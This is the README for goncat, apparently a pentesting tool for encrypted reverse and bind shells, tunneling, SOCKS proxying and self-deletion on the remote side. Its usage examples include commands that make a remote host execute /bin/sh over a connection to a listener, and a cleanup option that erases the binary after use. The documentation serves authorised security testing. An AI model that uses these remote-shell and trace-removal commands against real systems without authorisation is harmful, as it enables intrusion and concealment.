# goncat

[![Build and Test](https://github.com/dominicbreuker/goncat/actions/workflows/test.yml/badge.svg)](https://github.com/dominicbreuker/goncat/actions/workflows/test.yml)

goncat is a netcat-like tool you can use to create bind or reverse shells,
but designed to give you a more SSH-like experience.
It contains a few extra features that I missed from netcat.
First, goncat supports encryption with mutual authentication
so you don't have to write on one page of your pentest report that administrative access to servers without encryption or authentication is a problem
while writing on the next page how you did exactly that.
Second, it has automatic cross-platform PTY support for your convenience.
Third, it can be used for tunneling.
For now it supports local and remote port forwarding as well as barebones SOCKS (TCP CONNECT and UDP ASSOCIATE supported, but no authentication).
Lastly, there are a few other convenience features such as session logging
and automatic cleanup.

Disclaimer: please treat this tool as alpha. It is work an progress and may very well be turned upside down.

## Install

Clone this repository and run `make build` to build binaries for Linux, Windows and MacOS.
Downloads may be available in the [release section](https://github.com/DominicBreuker/goncat/releases)
once this tool is out of alpha and the interface is stable.

## Getting started

Akin to netcat, goncat allows to bind a socket or can be used to connect to one.
As with SSH, there is also a master and a slave side of the connection.
The master specifies the parameters for a connection, and the slave operates accordingly.
But master and slave behaviour is not tied to the client and server sides of the connection.
You can turn either side into whatever you want.
There is only one binary combining all features and it works cross-platform.

A few examples to illustrate basic use, which all assume a goncat binary exists on both your own machine and a remote one:

*   Reverse shell
    *   On your machine: `goncat master listen 'tcp://*:12345' --exec /bin/sh` to create a listener on port 12345 that will instruct the other end to execute `/bin/sh`.
    *   Remote: `goncat slave connect tcp://11.22.33.44:12345` to connect the remote side as a slave, which will execute `/bin/sh`.
*   Bind shell
    *   Remote: `goncat slave listen 'tcp://*:12345'` to listen in port 12345 for connections. The listener will do whatever a connecting master asks it to.
    *   On your machine: `goncat master connect tcp://55.66.77.88:12345 --exec /bin/sh` to connect to the remote host and make it execute `/bin/sh`.

Supported protocols include `tcp` (plain TCP connection), `ws` and `wss` (websocket connections), and `udp` (UDP with QUIC for reliability).

Advanced features can be enabled with additional flags:

*   Encryption: add `--ssl` on both ends to enable TLS encryption, which applies to all connections regardless of the protocol
*   Authentication: add `--key mypassword` on both ends to ensure no unexpected clients can connect (requires `--ssl`)
*   PTY: as master, add `--pty` to get a fully interactive shell (make sure you also execute a shell with `--exec`)
*   Local TCP port forwarding: as master, add `-L 8443:google.com:443` to open a local port 8443 on the master side, any connection to it will
    be forwarded through the slave to `google.com:443`
*   Remote TCP port forwarding: as master, add `-R 8443:google.com:443` to open a local port 8443 on the slave side, any connection to it will
    be forwarded through the master to `google.com:443`
*   SOCKS TCP/UDP proxy: as master, add `-D 127.0.0.1:1080` to create a SOCKS proxy, through which you can use the slave side (now with UDP support)
*   Logging: as master, add `--log /tmp/log.txt` to log the session to a file
*   Cleanup: as slave, add `--clean` to make goncat delete itself after execution

## A few Details

Encryption and authentication is implemented with (mutual) TLS.
To save you the hassle of generating certificates, goncat does that for you.
If you only enable `--ssl` you get encryption only.
The server side generates a new certificate on each run of `goncat ... listen`.
The client will accept any certificate without validation.
If you additionally enable `--key mypassword` then your password will be used as a seed
for the RNG used for certificate generation.
Both client and server generate and validate the certificates (but ignoring host name of course).

Logging is implemented in a simple way.
We just store all bytes send over the "main channel" to a file.
Main channel refers to that you saw on the screen when using goncat,
ignoring other data such as control messages required to sync master terminal size over to the slave when enabling PTY.
However, bear in mind that the log still looks a bit strange with PTY enabled.
I may find a better way in the future.

Lastly, a few notes on the cleanup feature.
I don't like it when leftover files fly around when you are done with a machine.
It is all too easy to forget deleting them.
Thus you can tell the slave side to `--clean` up after itself.
goncat will then attempt to delete itself before it terminates.
This works well on many Linux machines, where you can just delete your own binary.
On Windows things are a bit tricky.
At the moment, goncat launches a seperate CMD-based job to delete the binary 5 seconds after termination.
